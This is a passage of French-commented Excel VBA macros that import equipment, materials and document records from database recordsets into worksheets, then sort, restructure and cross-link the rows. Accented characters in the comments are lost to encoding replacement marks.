                        ElseIf .Cells(Rech.row, .Range("DecNiveauPose").Column).Value <> vbNullString Then
                            'Raccroch|fffd| |fffd| un p|fffd|re, on incr|fffd|mente le Num|fffd|ro de Pose
                            .Cells(Ligne, .Range("DecNiveauPose").Column).Value = VBA.val(.Cells(Rech.row, .Range("DecNiveauPose").Column).Value) + 1
                            .Cells(Ligne, .Range("DecOrdreTri").Column).Value = .Cells(Rech.row, .Range("DecOrdreTri").Column).Value & "_" & .Cells(Ligne, .Range("DecNoSimon").Column).Value
                            Change = True
                        End If
                    Else
                        .Rows.EntireRow(Ligne).Delete
                        Change = True
                    End If
                End If
            Next
        Loop
    End With

    Application.EnableEvents = True
End Sub


'D|fffd|placer les Ensembles de Niveau 0 au d|fffd|but du Decoupage
Sub Deplacer_Ensembles_Niveau_0(wsDec As Worksheet)
    Dim Ligne As Long, LigneDeb As Long, lLigneDecMax As Long
    
    With wsDec
        ' Initialisation
        LigneDeb = FirstLine(shDecoupage)
        Ligne = LigneDeb
        lLigneDecMax = Lastline(wsDec)
        ' Boucle
        Do While Ligne <= lLigneDecMax
            If .Cells(Ligne, .Range("DecNiveau").Column).Value = "E" And .Cells(Ligne, .Range("DecNiveauPose").Column).Value = 0 And Ligne > LigneDeb Then
                .Rows(Ligne).Cut
                .Rows(LigneDeb).Insert Shift:=xlDown
                Application.CutCopyMode = False
                LigneDeb = LigneDeb + 1
                Ligne = Ligne - 1
            End If
            Ligne = Ligne + 1
        Loop
    End With
End Sub


Sub Import_Materiels(adoRecordset As ADODB.Recordset)
    Dim WsMat As Worksheet
    Dim LigneMat As Long, LigneDec As Long, FirstLigne As Long
    Dim iColIndex As Integer, Pos As Integer, Mem_Niv_Four As Integer
    Dim Ref_Four As String, Nom_Four As String, No_Ens As String, No_SSEns As String, Arbo_Niveau As String
    Dim Eqt_Retenu As Boolean
    Dim vChaine As Variant
    
    Application.EnableEvents = False
    
    Set WsMat = ThisWorkbook.Worksheets(shMateriels)
    No_Ens = vbNullString
    No_SSEns = vbNullString
    Mem_Niv_Four = 0
    Arbo_Niveau = vbNullString
    Eqt_Retenu = False
    
    LigneMat = FirstLine(shMateriels)
    With adoRecordset
        .MoveFirst
        Do While Not (.EOF)
            vChaine = .Fields("ID_EQT").Value
            If Not (IsNull(vChaine)) And (No_SSEns <> VBA.Trim(vChaine)) Then
                No_SSEns = VBA.Trim(vChaine)
                LigneDec = Recherche_Decoupage(No_SSEns)
                If LigneDec = 0 Then
'    No_SSEns = VBA.Trim(adoRecordset.Fields("EQT_SUP").Value)
'    LigneDec = Recherche_Decoupage(No_SSEns)
'    If LigneDec = 0 Then
                    Eqt_Retenu = False
'    Else
'        Eqt_Retenu = True
'        Arbo_Niveau = ThisWorkbook.Worksheets(shDecoupage).Cells(LigneDec, ThisWorkbook.Worksheets(shDecoupage).Range("DecOrdreTri").Column).Value
'        Ecriture_Equipement_Superieur WsMat, LigneMat, ThisWorkbook.Worksheets(shDecoupage), LigneDec, Mem_Niv_Four
'    End If
                Else
                    Eqt_Retenu = True
                    Arbo_Niveau = ThisWorkbook.Worksheets(shDecoupage).Cells(LigneDec, ThisWorkbook.Worksheets(shDecoupage).Range("DecOrdreTri").Column).Value
                    Ecriture_Equipement_Superieur WsMat, LigneMat, ThisWorkbook.Worksheets(shDecoupage), LigneDec, Mem_Niv_Four
                End If
            End If
            
            If Eqt_Retenu Then
                WsMat.Cells(LigneMat, WsMat.Range("MatNumeroOrdre").Column).Formula = LigneMat
                For iColIndex = 0 To .Fields.Count - 1
                    vChaine = .Fields(iColIndex).Value
                    
                    If .Fields(iColIndex).Name = "NIV_SUP" Then 'Ensemble
                            'Stop
                    ElseIf .Fields(iColIndex).Name = "EQT_SUP" Then ' le Num|fffd|ro Simon de l'ensemble
                            If Not (IsNull(vChaine)) And (No_Ens <> VBA.Trim(vChaine)) Then
                                No_Ens = VBA.Trim(vChaine)
                            End If
                        
                    ElseIf .Fields(iColIndex).Name = "DES_SUP" Then
                            'Stop
                    ElseIf .Fields(iColIndex).Name = "NIV" Then  'Sous-Ensemble
                            'Stop
                    ElseIf .Fields(iColIndex).Name = "ID_EQT" Then   'le Num|fffd|ro Simon du Sous-Ensemble Niveau N+1
                            If IsNull(.Fields("ID_EQT").Value) Then
                                WsMat.Cells(LigneMat, WsMat.Range("MatCodePreco").Column).Formula = vbNullString
                            Else
                                WsMat.Cells(LigneMat, WsMat.Range("MatCodePreco").Column).Formula = VBA.Trim(.Fields("ID_EQT").Value)
                            End If
    
                    ElseIf .Fields(iColIndex).Name = "DES_EQT" Then
                            'Stop
    
                    ElseIf .Fields(iColIndex).Name = "MT_CLEP" Then
                            If IsNull(vChaine) Or (VBA.Trim(vChaine) = vbNullString) Then
                                WsMat.Cells(LigneMat, WsMat.Range("MatRepere").Column).Formula = "-"
                            Else
                                WsMat.Cells(LigneMat, WsMat.Range("MatRepere").Column).Formula = VBA.Trim(vChaine)
                            End If
                            
                    ElseIf .Fields(iColIndex).Name = "CTG" Then
                            If IsNull(vChaine) Then
                                WsMat.Cells(LigneMat, WsMat.Range("MatNature").Column).Formula = vbNullString
                            Else
                                WsMat.Cells(LigneMat, WsMat.Range("MatNature").Column).Formula = VBA.Trim(vChaine)
                            End If
                            
                    ElseIf .Fields(iColIndex).Name = "REF_FOUR" Then   'Mat|fffd|riel Sup|fffd|rieur et suffixe
                            If IsNull(vChaine) Then
                                WsMat.Cells(LigneMat, WsMat.Range("MatNum_SSEN").Column).Formula = vbNullString
                            Else
                                WsMat.Cells(LigneMat, WsMat.Range("MatNum_SSEN").Column).Formula = VBA.Trim(vChaine)
                            End If
                             'Pour le Tri , N|fffd| Ensemble, Sous Ensemble, N|fffd| SImon       No_Ens
                            WsMat.Cells(LigneMat, WsMat.Range("MatMabecSacim").Column).Formula = Arbo_Niveau & "_" & WsMat.Cells(LigneMat, WsMat.Range("MatCodePreco").Column).Formula '& "_" & VBA.Trim(adoRecordset.Fields(iColIndex).Value)
                        
                    ElseIf .Fields(iColIndex).Name = "REF_FOURP" Then   'R|fffd|f|fffd|rence du Mat|fffd|riel
                            If IsNull(vChaine) Then
                                Ref_Four = vbNullString
                            Else
                                Ref_Four = VBA.Trim(vChaine)
                            End If
                            Ctrl_Info_Fournisseur Ref_Four, .Fields("ID_EQT").Value, WsMat.Cells(LigneMat, WsMat.Range("MatRefFournisseur").Column)
    
                    ElseIf .Fields(iColIndex).Name = "NOM_FOURP" Then   'Nom du Fournisseur
                            If IsNull(vChaine) Then
                                Nom_Four = vbNullString
                            Else
                                Nom_Four = VBA.Trim(vChaine)
                            End If
                            Ctrl_Info_Fournisseur Nom_Four, .Fields("ID_EQT").Value, WsMat.Cells(LigneMat, WsMat.Range("MatNomFournisseur").Column)
    
                    ElseIf .Fields(iColIndex).Name = "REF_FOUR_ART" Then
                            If IsNull(vChaine) Then
                                Ref_Four = vbNullString
                            Else
                                Ref_Four = VBA.Trim(vChaine)
                            End If
                            Ctrl_Info_Fournisseur Ref_Four, .Fields("ID_EQT").Value, WsMat.Cells(LigneMat, WsMat.Range("MatRefFournisseur").Column)
                            
                            WsMat.Cells(LigneMat, WsMat.Range("MatNiveau").Column).Formula = "A" 'Article
                            WsMat.Cells(LigneMat, WsMat.Range("MatNiveauFour").Column).Formula = Mem_Niv_Four + 1
    
                    ElseIf .Fields(iColIndex).Name = "NOM_FOUR_ART" Then   'Nom du Fournisseur
                            If IsNull(vChaine) Then
                                Nom_Four = vbNullString
                            Else
                                Nom_Four = VBA.Trim(vChaine)
                            End If
                            Ctrl_Info_Fournisseur Nom_Four, .Fields("ID_EQT").Value, WsMat.Cells(LigneMat, WsMat.Range("MatNomFournisseur").Column)
                        
                    ElseIf .Fields(iColIndex).Name = "DES_ART" Then
                            If IsNull(vChaine) Then
                                WsMat.Cells(LigneMat, WsMat.Range("MatDesignation").Column).Formula = vbNullString
                            Else
                                WsMat.Cells(LigneMat, WsMat.Range("MatDesignation").Column).Formula = VBA.Trim(vChaine)
                            End If
                    ElseIf .Fields(iColIndex).Name = "REF_INTP" Then
                            If IsNull(vChaine) Then
                                WsMat.Cells(LigneMat, WsMat.Range("MatRefIntegrateur").Column).Formula = vbNullString
                            Else
                                WsMat.Cells(LigneMat, WsMat.Range("MatRefIntegrateur").Column).Formula = VBA.Trim(vChaine)
                            End If
                    ElseIf .Fields(iColIndex).Name = "NOM_INTP" Then
                            If IsNull(vChaine) Then
                                WsMat.Cells(LigneMat, WsMat.Range("MatNomIntegrateur").Column).Formula = vbNullString
                            Else
                                WsMat.Cells(LigneMat, WsMat.Range("MatNomIntegrateur").Column).Formula = VBA.Trim(vChaine)
                            End If
                        
                        'MatCodeEan
                        
                    ElseIf .Fields(iColIndex).Name = "QTEP" Then
                            If IsNull(vChaine) Then
                                WsMat.Cells(LigneMat, WsMat.Range("MatQuantite").Column).Formula = vbNullString
                            Else
                                WsMat.Cells(LigneMat, WsMat.Range("MatQuantite").Column).Formula = VBA.Trim(vChaine)
                            End If
                    ElseIf .Fields(iColIndex).Name = "CD_ARTP" Then
                            If IsNull(vChaine) Then
                                WsMat.Cells(LigneMat, WsMat.Range("MatMabecPreDocumente").Column).Formula = FunctionsCls.IntToPadString(vbNullString, 10)
                            Else
                                WsMat.Cells(LigneMat, WsMat.Range("MatMabecPreDocumente").Column).Formula = FunctionsCls.IntToPadString(VBA.Trim(vChaine), 10)
                            End If
                    ElseIf .Fields(iColIndex).Name = "CD_ART" Then
                            'Rien idem |fffd| CD_ARTP
                    ElseIf .Fields(iColIndex).Name = "TXT_NOMP" Then
                            If IsNull(vChaine) Then
                                WsMat.Cells(LigneMat, WsMat.Range("MatObservation").Column).Formula = vbNullString
                            Else
                                WsMat.Cells(LigneMat, WsMat.Range("MatObservation").Column).Formula = VBA.Trim(vChaine)
                            End If
                        
                        'MatNote
                        
                    ElseIf .Fields(iColIndex).Name = "TECH" Then
                            If IsNull(vChaine) Then
                                WsMat.Cells(LigneMat, WsMat.Range("MatTechnologie").Column).Formula = vbNullString
                            Else
                                WsMat.Cells(LigneMat, WsMat.Range("MatTechnologie").Column).Formula = VBA.Trim(vChaine)
                            End If
                            If WsMat.Cells(LigneMat, WsMat.Range("MatTechnologie").Column).Formula = "A" Then WsMat.Cells(LigneMat, WsMat.Range("MatTechnologie").Column).Formula = vbNullString 'G|fffd|n|fffd|ralit|fffd|s, non trait|fffd| dans TDI
                        
                    ElseIf .Fields(iColIndex).Name = "TYPE_ARTICLE" Then   'ZAAC, PHF1
                            '.Cells(LigneMat, .Range("MatTechnologie").Column).Formula = VBA.Trim(adoRecordset.Fields(iColIndex).Value)
                        
                    ElseIf .Fields(iColIndex).Name = "TYP_MAT" Then
                            If IsNull(vChaine) Then
                                WsMat.Cells(LigneMat, WsMat.Range("MatPieceRechange").Column).Formula = vbNullString
                            Else
                                WsMat.Cells(LigneMat, WsMat.Range("MatPieceRechange").Column).Formula = VBA.Trim(vChaine)
                            End If
                            If WsMat.Cells(LigneMat, WsMat.Range("MatPieceRechange").Column).Formula = "A" Then WsMat.Cells(LigneMat, WsMat.Range("MatPieceRechange").Column).Formula = "N"
                        
                        'MatRemarques
                        
                    ElseIf .Fields(iColIndex).Name = "DOC" Then
                            WsMat.Cells(LigneMat, WsMat.Range("MatDocument").Column).Formula = "SP" 'VBA.Trim(adoRecordset.Fields(iColIndex).Value)
                        'Case "FLAG_SUPPR"
                            'Rien
                        'Case "TYPE"
                            'Rien
                        
                    Else
                             'Stop 'il manque quelque chose
                    End If
                Next iColIndex
                
                Test_Limite_Excel WsMat, LigneMat
                LigneMat = LigneMat + 1
            End If
            .MoveNext
        Loop
    End With
    
    Sous_Ensembles_Decoupage 'Enlever les Sous-Ensembles restant de l'onglet Decoupage

    'Tri sur arborescence Mat|fffd|riel Sup|fffd|rieur, Suffixe, Niveau et Rep|fffd|re
    FirstLigne = FirstLine(shMateriels)
    WsMat.Rows(FirstLigne & ":" & Lastline(WsMat)).Sort _
        Key1:=WsMat.Cells(FirstLigne, WsMat.Range("MatMabecSacim").Column), Order1:=xlAscending, _
        Key2:=WsMat.Cells(FirstLigne, WsMat.Range("MatNiveauFour").Column), Order2:=xlAscending, _
        Key3:=WsMat.Cells(FirstLigne, WsMat.Range("MatRepere").Column), Order3:=xlAscending, _
        Header:=xlNo, OrderCustom:=1, MatchCase:=False, Orientation:=xlTopToBottom, _
        DataOption1:=xlSortNormal, DataOption2:=xlSortNormal, DataOption3:=xlSortNormal
        
        'DataOption1:=xlSortTextAsNumbers, DataOption2:=xlSortTextAsNumbers, DataOption3:=xlSortTextAsNumbers
    
    Traitement_Ensembles 'Import des Ensembles dans l'onglet Materiel

    Application.EnableEvents = True
End Sub


Function Recherche_Decoupage(No_Simon As String) As Long
    Dim Rech    As Object

    Recherche_Decoupage = 0
    With ThisWorkbook.Worksheets(shDecoupage)
        Set Rech = .Columns(.Range("DecNoSimon").Column).Find(what:=No_Simon, LookAt:=xlWhole)
        If Not Rech Is Nothing Then Recherche_Decoupage = Rech.row
    End With
End Function


Sub Ecriture_Equipement_Superieur(WsMat As Worksheet, ByRef LigneMat As Long, wsDec As Worksheet, LigneDec As Long, ByRef Mem_Niv_Four As Integer)
    Dim No_Simon_Sup  As String
    Dim Equip_Sup As String
    Dim Rech      As Object
    
    'Recherche de l'Equipement Sup|fffd|rieur N+2
    No_Simon_Sup = wsDec.Cells(LigneDec, wsDec.Range("DecPmp").Column).Value
    Set Rech = wsDec.Columns(wsDec.Range("DecNoSimon").Column).Find(what:=No_Simon_Sup, LookAt:=xlWhole)
    If Not Rech Is Nothing Then
        Equip_Sup = wsDec.Cells(Rech.row, wsDec.Range("DecNum_SSEN").Column).Value
        If LigneDec <> Rech.row Then 'El|fffd|ment Sup|fffd|rieur N+2 Trouv|fffd|
            'Equipement avec Mat|fffd|riels, Mettre |fffd| jour le Champ Nomenclature
            wsDec.Cells(Rech.row, wsDec.Range("DecNomencl").Column).Formula = "M" 'Founiture Mat|fffd|riels sans Documents
        End If
    
        Deplacer_Equipement wsDec, LigneDec, WsMat, LigneMat, Equip_Sup
        Mem_Niv_Four = VBA.val(WsMat.Cells(LigneMat, WsMat.Range("MatNiveauFour").Column).Value)
        
        LigneMat = LigneMat + 1
        WsMat.Cells(LigneMat, WsMat.Range("MatNumeroOrdre").Column).Formula = LigneMat
    
    Else 'Pas trouv|fffd| dans Decoupage, d|fffd|j|fffd| d|fffd|plac|fffd| dans Mat|fffd|riels
        Set Rech = WsMat.Columns(WsMat.Range("MatCodePreco").Column).Find(what:=No_Simon_Sup, LookAt:=xlWhole)
        If Not Rech Is Nothing Then Mem_Niv_Four = VBA.val(WsMat.Cells(Rech.row, WsMat.Range("MatNiveauFour").Column).Value)
    End If
End Sub


Sub Deplacer_Equipement(wsDec As Worksheet, LigneDec As Long, WsMat As Worksheet, LigneMat As Long, Equip_Sup As String)
    Application.EnableEvents = False
    With WsMat
        'Ecriture de l'|fffd|quipement Sup|fffd|rieur N+1
        If Caracteres_Compatibles_GedTmi(wsDec.Cells(LigneDec, wsDec.Range("DecRepere").Column).Value) Then
            .Cells(LigneMat, .Range("MatRepere").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecRepere").Column).Formula
        Else
            'Stop 'a v|fffd|rifier
            .Cells(LigneMat, .Range("MatRepere").Column).Formula = vbNullString
        End If
    
        If wsDec.Cells(LigneDec, wsDec.Range("DecNiveau").Column).Formula = "E" Then
            .Cells(LigneMat, .Range("MatNum_SSEN").Column).Formula = vbNullString 'Ne pas Documenter le Mat|fffd|riel Sup|fffd|rieur d'un Ensemble dans la feuille Mat|fffd|riel
        Else
            .Cells(LigneMat, .Range("MatNum_SSEN").Column).Formula = Equip_Sup 'wsDec.Cells(LigneDec, wsDec.Range("DecNum_SSEN").Column).Formula
        End If
        .Cells(LigneMat, .Range("MatNumeroOrdre").Column).Formula = LigneMat
        .Cells(LigneMat, .Range("MatSuf_SSEN").Column).Formula = vbNullString 'wsDec.Cells(LigneDec, wsDec.Range("DecSuf_SSEN").Column).Formula
        .Cells(LigneMat, .Range("MatNiveauFour").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecNiveauPose").Column).Formula
        .Cells(LigneMat, .Range("MatNiveau").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecNiveau").Column).Formula
        .Cells(LigneMat, .Range("MatNature").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecCategorie").Column).Formula
        .Cells(LigneMat, .Range("MatRefFournisseur").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecNum_SSEN").Column).Formula
        .Cells(LigneMat, .Range("MatSuffixeReference").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecSuf_SSEN").Column).Formula
        .Cells(LigneMat, .Range("MatNomFournisseur").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecNomFournisseur").Column).Formula
        .Cells(LigneMat, .Range("MatDesignation").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecDesignation").Column).Formula
        .Cells(LigneMat, .Range("MatRefIntegrateur").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecRefIntegrateur").Column).Formula
        .Cells(LigneMat, .Range("MatNomIntegrateur").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecNomIntegrateur").Column).Formula
        .Cells(LigneMat, .Range("MatCodeEan").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecCodeEan").Column).Formula
        .Cells(LigneMat, .Range("MatQuantite").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecQuantite").Column).Formula
        .Cells(LigneMat, .Range("MatMabecPreDocumente").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecSacimMabec").Column).Formula
        .Cells(LigneMat, .Range("MatObservation").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecObservation").Column).Formula
        .Cells(LigneMat, .Range("MatNote").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecNote").Column).Formula
        .Cells(LigneMat, .Range("MatPieceRechange").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecPieceRechange").Column).Formula
        .Cells(LigneMat, .Range("MatDocument").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecDocument").Column).Formula
        .Cells(LigneMat, .Range("MatTechnologie").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecTechnologie").Column).Formula
        .Cells(LigneMat, .Range("MatRemarques").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecRemarques").Column).Formula
        
        .Cells(LigneMat, .Range("MatCodePreco").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecNoSimon").Column).Formula
    
        'Pour le Tri , N|fffd| Ensemble, Sous Ensemble, N|fffd| SImon
        .Cells(LigneMat, .Range("MatMabecSacim").Column).Formula = wsDec.Cells(LigneDec, wsDec.Range("DecOrdreTri").Column).Formula '& "_" & wsDec.Cells(LigneDec, wsDec.Range("DecNum_SSEN").Column).Formula '& "_" & WsMat.Cells(LigneMat, WsMat.Range("MatCodePreco").Column).Formula
    End With
    
    If wsDec.Cells(LigneDec, wsDec.Range("DecNiveau").Column).Formula = "S" Then wsDec.Rows(LigneDec).EntireRow.Delete         'Supprimer la ligne Sous-Ensemble
    Application.EnableEvents = True
End Sub


Sub Import_Documents_Materiels(adoRecordset As ADODB.Recordset)
    Dim WsMat As Worksheet
    Dim iColIndex As Integer
    Dim Article As String, Document As String, sChaine As String
    Dim lEnd As Long
    
    Application.EnableEvents = False
    
    Set WsMat = ThisWorkbook.Worksheets(shMateriels)
    With adoRecordset
        .MoveFirst
        Do While Not (.EOF)
            ' Initialisation
            lEnd = .Fields.Count - 1
            iColIndex = 0
            ' Boucle
            Do While iColIndex > lEnd
                sChaine = .Fields(iColIndex).Name
'                If sChaine = "EQT_SUP" Then
'                    'Equipement Sup|fffd|rieur
'                ElseIf sChaine = "CD_ARTP" Then
'                    'Article
                If sChaine = "DOC_ART" Then
                    'Doc Article
                    If VBA.Trim(.Fields(iColIndex).Value) <> vbNullString Then
                        Article = VBA.Trim(.Fields("CD_ARTP").Value)
                        Document = VBA.Trim(.Fields("DOC_ART").Value)
                        Association_Document_Materiels Article, Document, WsMat
                    End If
'                Else
'                    Stop 'il manque quelque chose
                End If
                iColIndex = iColIndex + 1
            Loop
            ' Enregistrement suivant
            .MoveNext
        Loop
    End With
    Suppression_Articles_Fictif WsMat 'Articles fictif pour associer un Document |fffd| un Sous-Ensemble
    Application.EnableEvents = True
End Sub


Sub Suppression_Articles_Fictif(WsMat As Worksheet)
    'Articles fictif pour associer un Document |fffd| un Sous-Ensemble
    'Article Repere 0, Quantit|fffd| 0, portant le m|fffd|me couple R|fffd|f|fffd|r|fffd|nce/Nom que le Sous-Ensemble
    Dim Ligne As Long, lLigneDeb As Long, lLigneMax As Long
    Application.EnableEvents = True
    With WsMat
        On Error Resume Next
        ' Initialisation
        lLigneDeb = FirstLine(shMateriels)
        lLigneMax = Lastline(WsMat)
        Ligne = lLigneDeb
        Do While Ligne <= lLigneMax
            If .Cells(Ligne, .Range("MatNiveau").Column).Value = "S" And .Cells(Ligne + 1, .Range("MatNiveau").Column).Value = "A" _
              And .Cells(Ligne, .Range("MatRefFournisseur").Column).Value = .Cells(Ligne + 1, .Range("MatRefFournisseur").Column).Value _
               And .Cells(Ligne, .Range("MatNomFournisseur").Column).Value = .Cells(Ligne + 1, .Range("MatNomFournisseur").Column).Value _
                And .Cells(Ligne, .Range("MatDesignation").Column).Value = .Cells(Ligne + 1, .Range("MatDesignation").Column).Value _
                And VBA.val(.Cells(Ligne + 1, .Range("MatRepere").Column).Value) = 0 Then
                .Cells(Ligne, .Range("MatNature").Column).Value = .Cells(Ligne + 1, .Range("MatNature").Column).Value
                .Cells(Ligne, .Range("MatMabecPreDocumente").Column).Value = .Cells(Ligne + 1, .Range("MatMabecPreDocumente").Column).Value
                .Cells(Ligne, .Range("MatPieceRechange").Column).Value = .Cells(Ligne + 1, .Range("MatPieceRechange").Column).Value
                .Cells(Ligne, .Range("MatDocument").Column).Value = .Cells(Ligne + 1, .Range("MatDocument").Column).Value
                .Cells(Ligne, .Range("MatTechnologie").Column).Value = .Cells(Ligne + 1, .Range("MatTechnologie").Column).Value
                .Cells(Ligne, .Range("MatObservation").Column).Value = .Cells(Ligne + 1, .Range("MatObservation").Column).Value
                
                'Supprimer l'article sur la ligne + 1
                .Rows(Ligne + 1).EntireRow.Delete
            End If
            Ligne = Ligne + 1
        Loop
        On Error GoTo 0
    End With
    Application.EnableEvents = True
End Sub


Sub Association_Document_Materiels(ByVal Article As String, ByVal Document As String, WsMat As Worksheet)
    Dim Rech         As Object
    Dim FirstAddress As String
    Dim Categorie    As String

    Application.EnableEvents = False
    With WsMat
        Article = FunctionsCls.IntToPadString(Article, 10)
        Document = VBA.Right(Document, VBA.Len(Document) - 1) 'Enlev|fffd| le S Pr|fffd|c|fffd|dant le N|fffd| de Document
        
        Set Rech = .Columns(.Range("MatMabecPreDocumente").Column).Find(what:=Article, LookAt:=xlWhole)
        If Not Rech Is Nothing Then
            FirstAddress = Rech.Address
            Do
                'SP (Sans Plans), si la documentation n|fffd|est pas fournie,
                'Vide, Uniquement pour les cat|fffd|gories "B" et "R" (P19) et si le nom du fichier documentaire est identique |fffd| la r|fffd|f|fffd|rence  (Position 21).
                'Nom du fichier|fffd|, documentaire, si ce nom est diff|fffd|rent de la r|fffd|f|fffd|rence (P21). Ce nom  ne comporte pas l'Indice, le  Format, le Nombre de planches et l'extension utilis|fffd|s pour la d|fffd|claration du document sur le CD (voir norme EB00.20.600).
                
                Categorie = .Cells(Rech.row, .Range("MatNature").Column).Value
                If Categorie = "B" Or Categorie = "R" And Document = .Cells(Rech.row, .Range("MatRefFournisseur").Column).Value Then
                    .Cells(Rech.row, .Range("MatDocument").Column).Formula = vbNullString
                Else
                    If .Cells(Rech.row, .Range("MatDocument").Column).Formula = vbNullString Or .Cells(Rech.row, .Range("MatDocument").Column).Formula = "SP" Then
                        .Cells(Rech.row, .Range("MatDocument").Column).Formula = Document
                    Else 'Plusieurs documents associ|fffd|s |fffd| l'article
                        'Document et R|fffd|f|fffd|rence Fournisseur Identiques
                        If Document = .Cells(Rech.row, .Range("MatRefFournisseur").Column).Value Then
                            .Cells(Rech.row, .Range("MatDocument").Column).Formula = Document
                        ElseIf VBA.InStr(Document, " ") = 0 Then
                            .Cells(Rech.row, .Range("MatDocument").Column).Formula = Document
                        ElseIf .Cells(Rech.row, .Range("MatDocument").Column).Value <> .Cells(Rech.row, .Range("MatRefFournisseur").Column).Value Then
                            .Cells(Rech.row, .Range("MatDocument").Column).Formula = .Cells(Rech.row, .Range("MatDocument").Column).Formula & vbCrLf & Document
                        End If
                    End If
                End If
                Set Rech = .Columns(.Range("MatMabecPreDocumente").Column).FindNext(Rech)
            Loop While Not Rech Is Nothing And Rech.Address <> FirstAddress
        Else
            'Stop 'Pas trouv|fffd|
        End If
    End With
    Application.EnableEvents = True
End Sub


Sub Import_Documents_Equipements(adoRecordset As ADODB.Recordset)
    Dim wsDoc As Worksheet
    Dim LigneDoc As Long
    Dim DocSup As String, Equip As String, EquipSup As String, DocEquip As String, MemEquip As String
    Dim MemFidr As String, Categorie As String, Nom_Four As String, Ref_Four As String, CTG_S As String
    Dim sChaine As String
    Dim Pos As Integer
    
    Application.EnableEvents = False
    Application.ScreenUpdating = False
    Set wsDoc = ThisWorkbook.Worksheets(shDocuments)
    LigneDoc = FirstLine(shDocuments)
    
    With adoRecordset
        .MoveFirst
        MemEquip = vbNullString
        MemFidr = vbNullString
        Do While Not (.EOF)
                        
            'Equipement Sup|fffd|rieur
            DocSup = VBA.Trim(.Fields("DOC_SUP").Value)
            If DocSup <> vbNullString Then DocSup = VBA.Right(DocSup, VBA.Len(DocSup) - 1)                 'Enlev|fffd| le S Pr|fffd|c|fffd|dant le N|fffd| de Document
            
            DocEquip = VBA.Trim(.Fields("DOC").Value)
            If DocEquip <> vbNullString Then
                Equip = VBA.Trim(.Fields("ID_EQT").Value)
                EquipSup = Equipement_Superieur(Equip)
                DocEquip = VBA.Right(DocEquip, VBA.Len(DocEquip) - 1) 'Enlev|fffd| le S Pr|fffd|c|fffd|dant le N|fffd| de Document
                If DocSup = vbNullString Then
                    'Cas des FID sans FIDR, ajout d'une FIDR rattach|fffd|e |fffd| un GE
                    Pos = VBA.InStr(DocEquip, "_")
                    If Pos > 0 Then
                        Pos = Pos + 2 '2 Caract|fffd|res du suffixe
                        DocSup = VBA.Mid(DocEquip, 1, Pos)
                    Else
                        DocSup = DocEquip
                    End If
                End If
                Nom_Four = VBA.Trim(.Fields("NOM_FOUR").Value)
                Ref_Four = VBA.Trim(.Fields("REF_FOUR").Value)
                CTG_S = VBA.Trim(.Fields("CTG_S").Value)
                Categorie = Traitement_Categorie(CTG_S, Nom_Four, Ref_Four)
                
                With wsDoc
                    If EquipSup <> vbNullString Then
                        If MemEquip <> Equip Or MemFidr <> DocSup Then
                            MemEquip = Equip
                            MemFidr = DocSup
                            .Cells(LigneDoc, .Range("DocNumeroOrdre").Column).Formula = LigneDoc
                            .Cells(LigneDoc, .Range("DocNiveau").Column).Formula = "FR"
                            .Cells(LigneDoc, .Range("DocRefDocument").Column).Formula = DocSup
                            .Cells(LigneDoc, .Range("DocNature").Column).Formula = Categorie
                            Ctrl_Info_Fournisseur Nom_Four, Equip, .Cells(LigneDoc, .Range("DocNomFournisseur").Column)
                        '.Cells(LigneDoc, .Range("DocDesignation").Column).Formula = "DESIGNATION MANQUANTE"
                            If Equip <> vbNullString Then .Cells(LigneDoc, .Range("DocNum_SSEN").Column).Formula = EquipSup                                    'Equipement_Superieur(Equip)
                            LigneDoc = LigneDoc + 1
                            
                        End If
                        .Cells(LigneDoc, .Range("DocNumeroOrdre").Column).Formula = LigneDoc
                        .Cells(LigneDoc, .Range("DocNiveau").Column).Formula = "FD"
                        .Cells(LigneDoc, .Range("DocNum_SSEN").Column).Formula = DocSup
                        .Cells(LigneDoc, .Range("DocRefDocument").Column).Formula = DocEquip
                        .Cells(LigneDoc, .Range("DocNature").Column).Formula = Categorie
                        Ctrl_Info_Fournisseur Nom_Four, Equip, .Cells(LigneDoc, .Range("DocNomFournisseur").Column)
                        '.Cells(LigneDoc, .Range("DocDesignation").Column).Formula = "DESIGNATION MANQUANTE"
                    
                        Test_Limite_Excel wsDoc, LigneDoc
                        LigneDoc = LigneDoc + 1
    '                Else
    '                    'Stop
                    End If
                End With
            End If
            
            .MoveNext
        Loop
    End With
    Recherche_Doublons_Documents True
    Application.EnableEvents = True
    Application.ScreenUpdating = True
End Sub


Function Equipement_Superieur(No_Simon As String) As String
    Dim Rech         As Object
    Dim Nomencl      As String
    Dim FirstAddress As String
    Dim Equipement   As String
    
    Application.EnableEvents = False
    Equipement_Superieur = vbNullString
    With ThisWorkbook.Worksheets(shDecoupage)
        Set Rech = .Columns(.Range("DecNoSimon").Column).Find(what:=No_Simon, LookAt:=xlWhole)
        If Not Rech Is Nothing Then
            Equipement = .Cells(Rech.row, .Range("DecNum_SSEN").Column).Value
            Equipement_Superieur = Equipement
        End If
        
        Set Rech = .Columns(.Range("DecNum_SSEN").Column).Find(what:=Equipement, LookAt:=xlWhole)
        If Not Rech Is Nothing Then
            FirstAddress = Rech.Address
            Do
                'Equipement_Superieur = .Cells(Rech.Row, .Range("DecNum_SSEN").Column).Value
                'Ajout de Documents dans le D|fffd|coupage
                Nomencl = .Cells(Rech.row, .Range("DecNomencl").Column).Formula
                If Nomencl = "N" Then
                    .Cells(Rech.row, .Range("DecNomencl").Column).Formula = "D" 'avec Documents
                ElseIf Nomencl = "M" Then
